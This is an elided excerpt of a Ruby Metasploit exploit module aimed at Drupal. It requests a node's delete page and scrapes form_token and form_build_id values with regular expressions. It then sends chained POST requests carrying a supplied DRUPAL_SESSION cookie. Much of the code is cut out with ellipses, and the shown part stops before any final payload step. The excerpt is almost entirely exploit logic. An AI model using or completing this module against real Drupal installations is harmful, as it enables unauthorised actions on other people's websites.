...
class MetasploitModule < Msf::Exploit::Remote
    ...
    def extract_token(content)
      form_token = content.scan( /form_token" value="([^>]*)" \/>/).last.first
      vprint_status("form_token: #{form_token}")
      return form_token
    end

    def extract_build_id(content)
      form_build_id = content.scan( /form_build_id" value="([^>]*)" \/>/).last.first
    ...
    def start_exploit
      ...
      res = send_request_cgi({
        ...
        'method'   => 'GET',
        'uri'      => "#{uri_path}/?q=node/#{drupal_node}/delete"
      })
      #form_token = res.body.scan( /form_token" value="([^>]*)" \/>/).last.first
      form_token = extract_token(res.body)
      print_status("[*] form_token extracted: #{form_token}")
      r2 = send_request_cgi({
        'method'    => 'POST',
        'cookie' => datastore['DRUPAL_SESSION'],
      ...
      form_build_id = extract_build_id(r2.body)
      print_status("[*] form_build_id extracted: #{form_build_id}")
      r3 = send_request_cgi({
        'method'    => 'POST',
        'cookie' => datastore['DRUPAL_SESSION'],
